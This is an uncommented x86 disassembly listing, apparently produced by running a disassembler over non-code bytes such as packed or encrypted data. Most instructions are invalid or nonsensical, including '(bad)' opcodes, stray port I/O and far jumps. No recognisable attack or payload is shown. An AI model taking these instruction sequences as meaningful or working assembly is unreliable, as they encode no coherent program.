  41afcf:	mov    ss,edi
  41afd1:	jmp    0x7d5be0f9
  41afd6:	or     ch,dl
  41afd8:	and    esp,DWORD PTR [eax]
  41afda:	bound  esi,QWORD PTR [ebx-0x53]
  41afdd:	cmc    
  41afde:	or     ecx,DWORD PTR [ebx+0x3f5a3862]
  41afe4:	jmp    0xb946:0x34aec7bb
  41afeb:	pop    ss
  41afec:	retf   
  41afed:	sbb    ecx,DWORD PTR [esi+edx*8-0x71512363]
  41aff4:	xchg   cl,ch
  41aff6:	(bad)  
  41aff7:	mov    ds:0x431a4072,eax
  41affc:	add    BYTE PTR [esi],bl
  41affe:	jb     0x41afd4
  41b000:	into   
  41b001:	sbb    DWORD PTR [ebp+0x3b66fd8c],0x3b0d23f7
  41b00b:	mov    ds:0x3f49ad89,eax
  41b010:	cmp    DWORD PTR [edx],ebp
  41b012:	and    esp,DWORD PTR [edi]
  41b014:	and    al,0xa1
  41b016:	daa    
  41b017:	and    ch,cl
  41b019:	in     eax,0x12
  41b01b:	daa    
  41b01c:	and    al,0x91
  41b01e:	or     bl,BYTE PTR [edi]
  41b020:	and    al,0xf1
  41b022:	push   edx
  41b023:	loope  0x41b049
  41b025:	in     eax,dx
	...
  41b04e:	add    BYTE PTR [eax],al
  41b050:	cmp    eax,0xbaf0735b
  41b055:	leave  
  41b056:	sub    ch,ch
  41b058:	cmp    eax,0x3295005b
  41b05d:	inc    esi
  41b05e:	add    ah,ch
  41b060:	cmp    eax,0xbae47c5b
  41b065:	mov    BYTE PTR [edx],al
  41b067:	jge    0x41b08c
  41b069:	or     bh,BYTE PTR [ebp+eax*8+0x15]
  41b06d:	pop    ebx
  41b06e:	jnp    0x41b059
  41b070:	cmp    eax,0x266a0307
  41b075:	pop    esp
  41b076:	je     0x41b072
  41b078:	stos   BYTE PTR es:[edi],al
  41b079:	pop    ss
  41b07a:	and    al,0x11
  41b07c:	(bad)  
  41b07d:	sbb    cl,BYTE PTR [ecx-0xe670a49]
  41b083:	mov    esi,0x62307426
  41b088:	cmp    DWORD PTR [edi],0x3f416258
  41b08e:	adc    BYTE PTR [edx+0x12],dh
  41b091:	xor    al,0xd5
  41b093:	cmp    ecx,DWORD PTR [edx-0x2f7e312c]
  41b099:	mov    bh,ch
  41b09b:	mov    ss,esi
  41b09d:	push   ds
  41b09e:	and    al,0x0
  41b0a0:	neg    esi
  41b0a2:	jmp    0x41b0a5
  41b0a4:	retf   0xe77b
  41b0a7:	adc    bl,BYTE PTR [edx+ebx*1+0x24]
  41b0ab:	adc    BYTE PTR [edx+0x47],ah
  41b0ae:	sti    
  41b0af:	push   ecx
  41b0b0:	cmc    
  41b0b1:	push   es
  41b0b2:	into   
  41b0b3:	call   0x41b0b8
	...
  41b0dc:	add    BYTE PTR [eax],al
  41b0de:	xor    eax,0x44fffb8e
  41b0e3:	je     0x41b164
  41b0e5:	std    
  41b0e6:	xchg   esp,eax
  41b0e7:	or     BYTE PTR [ecx+eax*4-0x74ffa259],0x19
  41b0ef:	pop    edx
  41b0f0:	add    al,0x0
  41b0f2:	xchg   edi,eax
  41b0f3:	sbb    BYTE PTR [edi+0x50],cl
  41b0f6:	sbb    al,0xc4
  41b0f8:	call   0xfbb5081b
  41b0fd:	mov    esp,DWORD PTR [ebx-0x59aad797]
  41b103:	push   es
  41b104:	into   
  41b105:	mov    ebp,DWORD PTR [edi]
  41b107:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b108:	lock repnz inc eax
  41b10b:	jae    0x41b144
  41b10d:	ret    
  41b10e:	shl    BYTE PTR [ebp-0x79],1
  41b111:	inc    esp
  41b112:	jnp    0x41b179
  41b114:	aaa    
  41b115:	xchg   BYTE PTR [ebx-0x77],bh
  41b118:	std    
  41b119:	call   FWORD PTR [edx+0x4fbe8086]
  41b11f:	pop    ebx
  41b120:	add    BYTE PTR [eax],al
  41b122:	pop    ss
  41b123:	stc    
  41b124:	inc    eax
  41b125:	cmp    eax,0x5c17
  41b12a:	sbb    DWORD PTR [edx+0x7f],0xfffffffd
  41b12e:	and    eax,0x173d02f9
  41b133:	hlt    
  41b134:	(bad)  
  41b135:	call   DWORD PTR [ebx+0x4d]
  41b138:	xchg   DWORD PTR [ebx+ecx*1+0x15],ebx
  41b13c:	test   DWORD PTR [ebx+edi*8+0x58],ebp
  41b140:	sub    ebp,0x0
	...
  41b16a:	add    BYTE PTR [eax],al
  41b16c:	ds data16 and al,0x89
  41b170:	enter  0xfd8e,0xff
  41b174:	fldenv [ebp+0x52]
  41b177:	mov    DWORD PTR [eax],eax
  41b179:	jmp    0x41b19e
  41b17b:	lock leave 
  41b17d:	adc    DWORD PTR [edi+edi*8-0xfe8d3f],ebp
  41b184:	ret    
  41b185:	xchg   ch,bh
  41b187:	push   DWORD PTR [ecx+0x5224406b]
  41b18d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b18e:	loope  0x41b11b
  41b190:	add    dh,BYTE PTR [edi-0x1a]
  41b193:	jmp    0x2489be8c
  41b198:	test   BYTE PTR [eax+eax*2],0x24
  41b19c:	push   esi
  41b19d:	out    0x51,eax
  41b19f:	mov    DWORD PTR [eax+0x1a],esi
  41b1a2:	add    ecx,esi
  41b1a4:	jns    0x41b1e7
  41b1a6:	add    ebp,DWORD PTR [esi+0x17e4a]
  41b1ac:	mov    ebx,0x55fd08ce
  41b1b1:	xchg   edi,eax
  41b1b2:	jp     0x41b210
  41b1b4:	and    bh,BYTE PTR [edx-0x50340280]
  41b1ba:	jp     0x41b208
  41b1bc:	and    bl,BYTE PTR [edx+0x7e2a967a]
  41b1c2:	add    DWORD PTR [eax],eax
  41b1c4:	(bad)  
  41b1c5:	sub    eax,0x35c73c20
  41b1ca:	and    BYTE PTR [eax],bh
  41b1cc:	mov    bh,0x45
  41b1ce:	and    BYTE PTR [eax],dl
	...
  41b1f8:	add    BYTE PTR [eax],al
  41b1fa:	jns    0x41b199
  41b1fc:	or     eax,DWORD PTR [ebx+0x45014619]
  41b202:	and    eax,0x32867a79
  41b207:	jbe    0x41b20a
  41b209:	add    BYTE PTR [ebp+0x62],ch
  41b20c:	jns    0x41b1dc
  41b20e:	out    0x5a,al
  41b210:	pop    ebp
  41b211:	(bad)  
  41b212:	xrelease xchg DWORD PTR [esi-0x18a0ad83],ebx
  41b219:	add    edi,DWORD PTR [ebp-0x18802179]
  41b21f:	pop    edx
  41b220:	out    0x3,eax
  41b222:	pop    ss
  41b223:	pop    es
  41b224:	ret    
  41b225:	daa    
  41b226:	cmp    ebx,esi
  41b228:	mov    BYTE PTR [ebx],al
  41b22a:	ds pop ebx
  41b22c:	bound  ecx,QWORD PTR [edi+0x62]
  41b22f:	das    
  41b230:	jb     0x41b1e8
  41b232:	addr16 xchg esp,eax
  41b234:	ins    BYTE PTR es:[edi],dx
  41b235:	push   DWORD PTR [edi]
  41b237:	inc    esp
  41b238:	cs ins DWORD PTR es:[edi],dx
  41b23a:	cmp    al,0xd4
  41b23c:	es push ebx
  41b23e:	(bad)  
  41b23f:	push   ds
  41b240:	or     edx,DWORD PTR [eax]
  41b242:	(bad)  
  41b243:	jae    0x41b257
  41b245:	xlat   BYTE PTR ds:[ebx]
  41b246:	in     eax,dx
  41b247:	sub    ah,BYTE PTR [edi+esi*1+0x5a]
  41b24b:	inc    edi
  41b24c:	cwde   
  41b24d:	jp     0x41b1d7
  41b24f:	rcl    DWORD PTR [ebx-0x6a8ce5e1],1
  41b255:	lock imul eax,DWORD PTR [edi+0x4f1a67d0],0xffffff99
  41b25d:	das    
	...
  41b286:	add    BYTE PTR [eax],al
  41b288:	(bad)  
  41b289:	cs retf 
  41b28b:	xor    ebp,ebx
  41b28d:	sub    al,0x72
  41b28f:	mov    ch,0x56
  41b291:	jg     0x41b28b
  41b293:	in     eax,0x43
  41b295:	sar    edi,cl
  41b297:	jns    0x41b21b
  41b299:	aas    
  41b29a:	pop    ds
  41b29b:	dec    ebp
  41b29c:	mov    ss,edx
  41b29e:	lods   eax,DWORD PTR ds:[esi]
  41b29f:	fadd   QWORD PTR [esi]
  41b2a1:	(bad)  
  41b2a2:	(bad)  
  41b2a3:	in     eax,0x67
  41b2a5:	mov    al,ds:0x6f625862
  41b2aa:	inc    ebp
  41b2ab:	adc    al,0xc7
  41b2ad:	pop    ss
  41b2ae:	add    esi,DWORD PTR [edi+esi*4]
  41b2b1:	das    
  41b2b2:	add    BYTE PTR ds:0x54cde4e,cl
  41b2b8:	sub    bl,dh
  41b2ba:	push   esp
  41b2bb:	int    0x19
  41b2bd:	aam    0x44
  41b2bf:	lds    ecx,FWORD PTR [ebp+0x30]
  41b2c2:	push   ebx
  41b2c3:	cmp    DWORD PTR [edi-0x6b],esp
  41b2c6:	call   0xfdcaa383
  41b2cb:	jb     0x41b2e3
  41b2cd:	aas    
  41b2ce:	cmp    BYTE PTR [esi],dl
  41b2d0:	ins    DWORD PTR es:[edi],dx
  41b2d1:	aam    0xce
  41b2d3:	(bad)  
  41b2d5:	jae    0x41b278
  41b2d7:	js     0x41b27c
  41b2d9:	mov    BYTE PTR [ecx],bh
  41b2db:	sub    al,0x19
  41b2dd:	inc    ecx
  41b2de:	mov    DWORD PTR [ebp+0x6f394349],esp
  41b2e4:	pop    esi
  41b2e5:	pop    edi
  41b2e6:	add    cl,ch
  41b2e8:	sub    BYTE PTR [esi-0x7f],bl
  41b2eb:	xchg   DWORD PTR [eax],eax
	...
  41b315:	add    BYTE PTR [edx],dh
  41b317:	pop    edi
  41b318:	add    cl,ch
  41b31a:	cmp    eax,0x3df4180f
  41b31f:	pop    edx
  41b320:	add    cl,ch
  41b322:	loope  0x41b37d
  41b324:	and    DWORD PTR [esi],0xdc170f3c
  41b32a:	cmp    eax,0xd9e90002
  41b32f:	pop    ecx
  41b330:	or     DWORD PTR [esi],0x9e0b0f3f
  41b336:	in     eax,dx
  41b337:	ror    esi,cl
  41b339:	adc    DWORD PTR [edi+0x76],esp
  41b33c:	std    
  41b33d:	test   BYTE PTR [esi],0x88
  41b340:	jmp    0x24396a0e
  41b345:	stc    
  41b346:	xor    BYTE PTR [esi-0x2bc21603],al
  41b34c:	rol    DWORD PTR [edx],1
  41b34e:	repz sub BYTE PTR [ebx+0x62],dl
  41b352:	shl    DWORD PTR [edx-0x3b],cl
  41b355:	add    cl,ch
  41b357:	jle    0x41b354
  41b359:	inc    ebp
  41b35a:	xchg   esp,eax
  41b35b:	scas   eax,DWORD PTR es:[edi]
  41b35c:	std    
  41b35d:	je     0x41b359
  41b35f:	add    BYTE PTR [esp+0x17],ch
  41b363:	add    eax,DWORD PTR [esp+0x33]
  41b367:	sbb    al,0x48
  41b369:	mov    DWORD PTR [ebx],ebp
  41b36b:	cmp    ebx,DWORD PTR [eax+0x3b]
  41b36e:	scas   eax,DWORD PTR es:[edi]
  41b36f:	mov    ?,WORD PTR [edi-0x49]
  41b372:	scas   eax,DWORD PTR es:[edi]
  41b373:	jle    0x41b370
  41b375:	test   DWORD PTR [eax+0x9c818e],edi
	...
  41b3a3:	add    bh,dl
  41b3a5:	pop    ecx
  41b3a6:	add    BYTE PTR [ebx-0x79f4a6b8],al
  41b3ac:	and    al,0x5a
  41b3ae:	add    BYTE PTR [eax],al
  41b3b0:	sub    al,0x4e
  41b3b2:	and    al,0x10
  41b3b4:	lock add bh,BYTE PTR [edi+0x4d2a502b]
  41b3bb:	mov    edi,DWORD PTR [ecx]
  41b3bd:	mov    ds:0x7ef8ee2b,al
  41b3c2:	xchg   DWORD PTR [ebx+eax*2+0x37],edx
  41b3c6:	push   ebx
  41b3c7:	push   edx
  41b3c8:	sbb    al,0xd0
  41b3ca:	xchg   eax,ebp
  41b3cc:	call   FWORD PTR [eax-0x13]
  41b3cf:	call   FWORD PTR [eax]
  41b3d1:	xor    eax,ecx
  41b3d3:	jg     0x41b377
  41b3d5:	add    al,BYTE PTR [esp-0x71]
  41b3d9:	xor    al,BYTE PTR [esi+0x596324]
  41b3df:	jne    0x41b42f
  41b3e1:	fidivr DWORD PTR [esi+0x596328]
  41b3e7:	add    bl,al
  41b3e9:	push   ecx
  41b3ea:	cmp    DWORD PTR [eax],eax
  41b3ec:	and    bl,BYTE PTR [ecx+0x0]
  41b3ef:	jl     0x41b413
  41b3f1:	fdivp  st(3),st
  41b3f3:	add    dl,BYTE PTR [ebx+0x3e003933]
  41b3f9:	das    
  41b3fa:	add    al,0x0
  41b3fc:	call   0xfc46:0x3dfd867f
  41b403:	push   esp
  41b404:	outs   dx,BYTE PTR ds:[esi]
  41b405:	or     edx,edx
  41b407:	call   0x41b40c
	...
  41b430:	add    BYTE PTR [eax],al
  41b432:	ja     0x41b3f7
  41b434:	loope  0x41b433
  41b436:	in     eax,0x8c
  41b438:	inc    eax
  41b439:	pop    ecx
  41b43a:	xchg   ecx,eax
  41b43b:	icebp  
  41b43c:	retf   
  41b43d:	std    
  41b43e:	mov    cl,dh
  41b440:	(bad)  
  41b441:	cmp    ah,bh
  41b443:	mov    al,BYTE PTR [ecx]
  41b445:	mov    DWORD PTR [edx-0x62],ebp
  41b448:	icebp  
  41b449:	mov    ch,bh
  41b44b:	test   eax,0x97350ca
  41b450:	shr    al,cl
  41b452:	and    esp,ebx
  41b454:	loope  0x41b453
  41b456:	add    esi,ecx
  41b458:	lock jmp FWORD PTR [edx]
  41b45b:	das    
  41b45c:	in     eax,dx
  41b45d:	adc    BYTE PTR [ebp-0x4cefda32],dh
  41b463:	mov    ecx,0xf8ec4fe2
  41b468:	shr    eax,1
  41b46a:	cmp    DWORD PTR [ecx+eiz*8],ebp
  41b46d:	std    
  41b46e:	mov    ch,0xc6
  41b470:	and    eax,0x173c354
  41b475:	add    BYTE PTR [esi],bh
  41b477:	mov    edx,eax
  41b479:	jno    0x41b49a
  41b47b:	(bad)  
  41b47d:	add    BYTE PTR [esi],bh
  41b47f:	jb     0x41b482
  41b481:	mov    DWORD PTR [eax+0x3e000586],edi
  41b487:	shl    DWORD PTR [ecx],0x89
  41b48a:	sub    BYTE PTR [edx-0x19],0xeb
  41b48e:	dec    ecx
  41b48f:	test   DWORD PTR [esi+ebp*4],eax
  41b492:	sub    dh,BYTE PTR [esi+0x1]
	...
  41b4bd:	add    BYTE PTR [eax],al
  41b4bf:	add    BYTE PTR ds:0xacdd1d57,bh
  41b4c5:	pop    ebx
  41b4c6:	int3   
  41b4c7:	xchg   bh,dh
  41b4c9:	sub    eax,0xffffff81
  41b4cc:	inc    edx
  41b4cd:	pop    edi
  41b4ce:	out    0x3,eax
  41b4d0:	lds    ecx,FWORD PTR [edi]
  41b4d2:	loopne 0x41b52c
  41b4d4:	sub    eax,edx
  41b4d6:	ins    DWORD PTR es:[edi],dx
  41b4d7:	repz cmp eax,0xb88ce75b
  41b4dd:	(bad)  
  41b4de:	jmp    0x41b4e3
  41b4e0:	sbb    esp,DWORD PTR ds:[eax-0x6f]
  41b4e4:	push   edx
  41b4e5:	pop    edi
  41b4e6:	out    0x3,eax
  41b4e8:	rcr    esp,0xf7
  41b4eb:	pop    es
  41b4ec:	ds pop ebx
  41b4ee:	bound  ecx,QWORD PTR [ecx+0x3e75f36]
  41b4f4:	les    ebp,FWORD PTR [edx-0x17]
  41b4f7:	mov    ch,0xc8
  41b4f9:	cwde   
  41b4fa:	outs   dx,DWORD PTR ds:[esi]
  41b4fb:	repz shl ch,0xd3
  41b4ff:	pop    es
  41b500:	ds pop ebx
  41b502:	hlt    
  41b503:	cld    
  41b504:	(bad)  
  41b505:	fdivr  st(7),st
  41b507:	pop    es
  41b508:	ds pop ebx
  41b50a:	jo     0x41b495
  41b50c:	inc    esi
  41b50d:	pop    edi
  41b50e:	out    0x3,eax
  41b510:	(bad)  
  41b511:	rcr    DWORD PTR [ebp-0x1],1
  41b514:	cmp    eax,0xc08ce75b
  41b519:	push   0xffffffe3
  41b51b:	add    edi,DWORD PTR [esi]
  41b51d:	shr    BYTE PTR [ebp-0x5],1
  41b520:	cmp    eax,0x8de75b
	...
  41b54d:	add    BYTE PTR [esi+0x59],cl
  41b550:	cmp    ecx,esp
  41b552:	jl     0x41b526
  41b554:	test   DWORD PTR [eax+eax*8],0x3e03eb66
  41b55b:	push   cs
  41b55c:	lock mov ?,WORD PTR [eax+0x3e03eb6a]
  41b563:	shl    BYTE PTR [ebp-0x5],cl
  41b566:	cmp    eax,0x7de9005b
  41b56b:	fimul  DWORD PTR [esi+0x5b39cd]
  41b571:	jo     0x41b527
  41b573:	imul   eax,DWORD PTR [ecx+ebp*8],0x3d
  41b577:	aam    0x86
  41b579:	icebp  
  41b57a:	inc    ecx
  41b57b:	pop    ebx
  41b57c:	add    BYTE PTR [ecx-0x26792ba6],bh
  41b582:	inc    ecx
  41b583:	pop    ebx
  41b584:	add    BYTE PTR [edi+0x67895b3a],ah
  41b58a:	ds push edi
  41b58c:	add    cl,ch
  41b58e:	ret    0x18d9
  41b591:	in     eax,dx
  41b592:	cmp    eax,0xea4eff5b
  41b597:	pop    esi
  41b598:	add    cl,ch
  41b59a:	sub    dl,BYTE PTR [esi+0x17c2c9d2]
  41b5a0:	and    al,0x25
  41b5a2:	rcr    DWORD PTR [ebx+0xfb2b874],0x24
  41b5a9:	or     ebx,ecx
  41b5ab:	jmp    0x5b7f9ac0
  41b5b0:	sub    DWORD PTR [ebp+0x0],edi
	...
  41b5da:	add    BYTE PTR [eax],al
  41b5dc:	popa   
  41b5dd:	sub    ecx,DWORD PTR [edi+0x72]
  41b5e0:	int3   
  41b5e1:	addr16 add al,0xe9
  41b5e4:	cmp    eax,0x4a054c34
  41b5e9:	sub    eax,0xab9e9e4f
  41b5ee:	and    DWORD PTR ds:0xbcc0dd8a,0x2a892649
  41b5f8:	xor    esp,DWORD PTR [eax]
  41b5fa:	pop    esi
  41b5fb:	push   0x76
  41b5fd:	inc    ebx
  41b5fe:	ret    0x3a01
  41b601:	aam    0x86
  41b603:	stc    
  41b604:	inc    ecx
  41b605:	pop    ebx
  41b606:	add    dl,al
  41b608:	stc    
  41b609:	ss push eax
  41b60b:	add    BYTE PTR [edx-0x2ba1a4c1],ah
  41b611:	xchg   edx,eax
  41b612:	cmp    dl,al
  41b614:	divps  xmm7,XMMWORD PTR [eax+0x502700]
  41b61b:	ret    
  41b61c:	lods   al,BYTE PTR ds:[esi]
  41b61d:	sbb    ah,BYTE PTR [esp+eax*1]
  41b620:	lods   al,BYTE PTR ds:[esi]
  41b621:	xchg   esi,eax
  41b622:	mov    ebp,0x44d124e9
  41b627:	or     BYTE PTR [edi-0x68],ah
  41b62a:	xchg   DWORD PTR [ebx+edi*1+0x6b],eax
  41b62e:	jge    0x41b61c
  41b630:	xor    edx,DWORD PTR [ebx+0x0]
  41b633:	add    BYTE PTR [edx-0x62],ch
  41b636:	jno    0x41b63f
  41b638:	call   0x5dd7:0x42c
  41b63e:	mov    edi,0x8b
	...
  41b667:	add    BYTE PTR [eax],al
  41b669:	add    BYTE PTR [ebx+0x3a],dl
  41b66c:	inc    esp
  41b66d:	add    al,0xe7
  41b66f:	pop    ebp
  41b670:	xchg   DWORD PTR [ebx+edi*8-0x28fffbe3],edx
  41b677:	dec    esp
  41b678:	xchg   DWORD PTR [ebx+edi*8-0x58fffbe3],ecx
  41b67f:	inc    edi
  41b680:	xchg   DWORD PTR [ebx+edi*2-0x68fffb9f],edx
  41b687:	dec    esp
  41b688:	push   eax
  41b689:	mov    ebx,DWORD PTR [ebx]
  41b68b:	cmp    al,BYTE PTR [eax+0x4]
  41b68e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b68f:	pop    ebp
  41b690:	push   edx
  41b691:	push   eax
  41b692:	repnz adc DWORD PTR [eax+ebx*1],esp
  41b696:	out    dx,eax
  41b697:	dec    ebp
  41b698:	icebp  
  41b699:	inc    DWORD PTR [eax-0x23]
  41b69c:	les    ebp,FWORD PTR [ebx+ebp*2]
  41b69f:	pop    ebp
  41b6a0:	add    bl,al
  41b6a2:	push   ebx
  41b6a3:	xchg   edx,eax
  41b6a4:	int3   
  41b6a5:	int3   
  41b6a6:	xor    edx,DWORD PTR [edx-0x6dec3334]
  41b6ac:	int3   
  41b6ad:	int3   
  41b6ae:	ds mov edi,0x7fbfe38a
  41b6b4:	rol    BYTE PTR [eax],cl
  41b6b6:	ds je  0x41b6ed
  41b6b9:	push   esi
  41b6ba:	jmp    0x6f49eccb
  41b6bf:	ins    DWORD PTR es:[edi],dx
  41b6c0:	adc    BYTE PTR [esi+0x3f57eaed],dh
  41b6c6:	ds or  edx,esp
  41b6c9:	mov    edi,0xb60e7626
	...
  41b6f6:	add    BYTE PTR [eax],al
  41b6f8:	inc    edx
  41b6f9:	or     BYTE PTR [edi+ebp*8+0xd0593bd],0xd1
  41b701:	push   es
  41b702:	or     ebp,eax
  41b704:	mov    esi,DWORD PTR [ebx]
  41b706:	add    al,0x83
  41b708:	push   es
  41b709:	jp     0x41b783
  41b70b:	iret   
  41b70c:	inc    ecx
  41b70d:	or     bl,al
  41b70f:	mov    BYTE PTR [edx-0x42be33a9],al
  41b715:	mov    ebp,0xa3ef7c1c
  41b71a:	scas   eax,DWORD PTR es:[edi]
  41b71b:	mov    bp,0x104f
  41b71f:	call   DWORD PTR [edx-0x74]
  41b722:	mov    eax,ss
  41b724:	leave  
  41b725:	mov    edx,0xa83e4c8f
  41b72a:	jmp    0x278a:0xef9ec301
  41b731:	jae    0x41b6b5
  41b733:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b734:	jecxz  0x41b6b8
  41b736:	fdivp  st(5),st
  41b738:	cdq    
  41b739:	jb     0x41b6bd
  41b73b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b73c:	ret    
  41b73d:	sbb    dh,0xfd
  41b740:	mov    DWORD PTR [edx+0x14],esi
  41b743:	fnstenv [ecx]
  41b745:	or     BYTE PTR [edx+0x1b2f090],al
  41b74b:	mov    ebp,DWORD PTR [edx]
  41b74d:	stos   BYTE PTR es:[edi],al
  41b74e:	cmp    dh,0x4a
  41b751:	pop    ebx
  41b752:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b753:	or     DWORD PTR [edi+edx*1+0x17c6cbd4],esi
  41b75a:	hlt    
  41b75b:	jae    0x41b75d
	...
  41b785:	add    BYTE PTR [edi+0x53],ah
  41b788:	popa   
  41b789:	dec    eax
  41b78a:	or     eax,0x25486faf
  41b78f:	jmp    0x41b73b
  41b791:	xor    BYTE PTR [edi],0x5f
  41b794:	jae    0x41b752
  41b796:	neg    DWORD PTR [esi-0x19]
  41b799:	add    edi,DWORD PTR [esi]
  41b79b:	push   eax
  41b79c:	popf   
  41b79d:	or     esi,0xc5042808
  41b7a3:	inc    esi
  41b7a4:	out    dx,eax
  41b7a5:	adc    BYTE PTR [eax],0x43
  41b7a8:	dec    esp
  41b7a9:	or     dh,BYTE PTR [esi+edx*1+0x16b6cbfc]
  41b7b0:	fdiv   QWORD PTR [ebx-0x19]
  41b7b3:	push   edx
  41b7b4:	popa   
  41b7b5:	inc    edi
  41b7b6:	sub    eax,0x45475faf
  41b7bb:	jmp    0x41b7e7
  41b7bd:	and    edi,0x42
  41b7c0:	sbb    edi,DWORD PTR [ebp-0x6a195bd7]
  41b7c6:	mov    edi,0x3e4515ba
  41b7cb:	fild   DWORD PTR [ebx]
  41b7cd:	or     DWORD PTR [esi-0x38f20ca6],ebp
  41b7d3:	push   esi
  41b7d4:	push   esp
  41b7d5:	fld    TBYTE PTR ds:0xc20ce71a
  41b7db:	int    0xf7
  41b7dd:	fisub  WORD PTR [ebx-0x406a1181]
  41b7e3:	ret    0x44dd
  41b7e6:	ds fcmovne st,st(3)
  41b7e9:	or     BYTE PTR [eax],al
	...
  41b813:	add    BYTE PTR [esi-0x48f244a6],ch
  41b819:	push   esi
  41b81a:	pop    esp
  41b81b:	fucomi st,st(5)
  41b81d:	sbb    DWORD PTR [eax],eax
  41b81f:	jmp    0xd9fd8f66
  41b824:	mov    BYTE PTR [ebp-0x3],bh
  41b827:	stos   BYTE PTR es:[edi],al
  41b828:	mov    esp,0x7f9d1881
  41b82d:	sbb    al,0x81
  41b82f:	adc    ecx,DWORD PTR [ebp+0x4e]
  41b832:	mov    ebx,ss
  41b834:	push   0xb674fd7d
  41b839:	push   0xfffffffd
  41b83b:	(bad)  
  41b83c:	sbb    ebp,DWORD PTR [eax+ebp*8]
  41b83f:	loopne 0x41b87e
  41b841:	pop    ebx
  41b842:	add    BYTE PTR [esi-0x2a78db95],cl
  41b848:	popa   
  41b849:	cdq    
  41b84a:	or     cl,ch
  41b84c:	push   eax
  41b84d:	(bad)  
  41b84e:	jecxz  0x41b8b8
  41b850:	push   cs
  41b851:	fadd   QWORD PTR [eax]
  41b853:	jmp    0x1e97e495
  41b858:	mov    bh,0x1a
  41b85a:	or     BYTE PTR [ecx+esi*1-0x25],ch
  41b85e:	mov    bh,0xd9
  41b860:	cmp    eax,0xff60005b
  41b865:	fadd   st(0),st
  41b867:	in     eax,dx
  41b868:	mov    dh,0x4c
  41b86a:	jg     0x41b7f3
  41b86c:	inc    edx
  41b86d:	pop    ebx
  41b86e:	cld    
  41b86f:	jmp    0x62482e70
  41b874:	daa    
  41b875:	(bad)  
  41b876:	in     al,0xa9
	...
  41b8a0:	add    BYTE PTR [eax],al
  41b8a2:	xor    ebx,DWORD PTR [ebx+0x0]
  41b8a5:	test   al,0xa3
  41b8a7:	push   ecx
  41b8a8:	pop    es
  41b8a9:	ja     0x41b872
  41b8ab:	inc    ebx
  41b8ac:	jg     0x41b834
  41b8ae:	inc    edx
  41b8af:	pop    ebx
  41b8b0:	cld    
  41b8b1:	jmp    0xf04c2932
  41b8b6:	jnp    0x41b88e
  41b8b8:	xor    ah,BYTE PTR [eax-0x38]
  41b8bb:	fadd   st(2),st
  41b8bd:	in     eax,0xb6
  41b8bf:	inc    ebx
  41b8c0:	jg     0x41b8c2
  41b8c2:	lock xchg esi,eax
  41b8c4:	or     eax,DWORD PTR [eax]
  41b8c6:	addr16 cdq 
  41b8c8:	jmp    0x41b8d0
  41b8ca:	pop    esp
  41b8cb:	pusha  
  41b8cc:	test   DWORD PTR [esi],edi
  41b8ce:	fsubr  QWORD PTR [ebx+0x7d]
  41b8d1:	out    0x57,al
  41b8d3:	stos   BYTE PTR es:[edi],al
  41b8d4:	(bad)  
  41b8d5:	jmp    DWORD PTR [esi]
  41b8d7:	jne    0x41b8e5
  41b8d9:	mov    ecx,DWORD PTR [ebx+ebx*8-0x21]
  41b8dd:	aas    
  41b8de:	push   ss
  41b8df:	jl     0x41b8f1
  41b8e1:	or     DWORD PTR [ecx],ebx
  41b8e3:	aam    0x18
  41b8e5:	add    DWORD PTR [edi+edx*2-0x10],0xe7992703
  41b8ed:	add    al,0x1e
  41b8ef:	rol    BYTE PTR [ebp+0x7fcbae32],0xc2
  41b8f6:	and    edx,ebx
  41b8f8:	xor    BYTE PTR [ebx+0x33075f01],al
  41b8fe:	sahf   
  41b8ff:	imul   eax,DWORD PTR [ebp-0x7d],0xffffffd7
  41b903:	push   ebp
  41b904:	or     ecx,0x0
	...
  41b92e:	add    BYTE PTR [eax],al
  41b930:	xor    dl,ch
  41b932:	mov    DWORD PTR [ebp+0x67],eax
  41b935:	dec    edx
  41b936:	call   0x9b9062
  41b93b:	pop    edi
  41b93c:	jns    0x41b982
  41b93e:	test   esp,ebp
  41b940:	sbb    bl,BYTE PTR [ecx+0x165c0004]
  41b946:	and    al,0x4
  41b948:	ins    DWORD PTR es:[edi],dx
  41b949:	dec    edx
  41b94a:	je     0x41b98d
  41b94c:	xlat   BYTE PTR ds:[ebx]
  41b94d:	ror    BYTE PTR [edx],cl
  41b94f:	mov    DWORD PTR [edi+0x2404c2da],ebp
  41b955:	call   0x4174:0xca2d8104
  41b95c:	xchg   edi,eax
  41b95d:	sub    ebp,esi
  41b95f:	ret    0x59a3
  41b962:	xchg   DWORD PTR [esi+edi*1+0x50],eax
  41b966:	or     BYTE PTR [edx+0x42a7ee],bh
  41b96c:	mov    ch,0x8b
  41b96e:	mov    cl,BYTE PTR [edx]
  41b970:	mov    ebp,0x7c810533
  41b975:	outs   dx,DWORD PTR ds:[esi]
  41b976:	cmp    dl,0x8e
  41b979:	mov    DWORD PTR [edx+0x0],0x4bf65ec
  41b980:	ds (bad) 
  41b982:	mov    ah,bl
  41b984:	out    dx,al
  41b985:	ret    
  41b986:	xor    BYTE PTR [ecx+0x5b887c03],cl
  41b98c:	xor    al,BYTE PTR [edi]
  41b98e:	ss clc 
  41b990:	mov    edx,fs
  41b992:	jmp    0x41b9b4
	...
  41b9bb:	add    BYTE PTR [eax],al
  41b9bd:	add    BYTE PTR [esi],bh
  41b9bf:	jb     0x41b9c2
  41b9c1:	push   0x42068e
  41b9c6:	mov    bl,0x2f
  41b9c8:	fcom   QWORD PTR [eax+0x26]
  41b9cb:	int3   
  41b9cc:	add    al,0x0
  41b9ce:	ds inc ecx
  41b9d0:	xchg   DWORD PTR [ebx+0x6],eax
  41b9d3:	inc    ebx
  41b9d4:	in     al,dx
  41b9d5:	jo     0x41ba15
  41b9d7:	jb     0x41b9da
  41b9d9:	pop    ecx
  41b9da:	(bad)  
  41b9db:	mov    ?,WORD PTR [edi]
  41b9dd:	ret    0x7246
  41b9e0:	mov    DWORD PTR ss:[edx-0x7576f3aa],eax
  41b9e7:	mov    es,WORD PTR ds:0x932ff87
  41b9ed:	mov    dh,0x47
  41b9ef:	mov    bl,0xe3
  41b9f1:	sbb    BYTE PTR [edi+0x7ebf8c78],dh
  41b9f7:	test   DWORD PTR [edi-0xb2c80f9],ecx
  41b9fd:	or     BYTE PTR [ebx+edi*8+0xd],al
  41ba01:	xchg   DWORD PTR [edi+0x32],edi
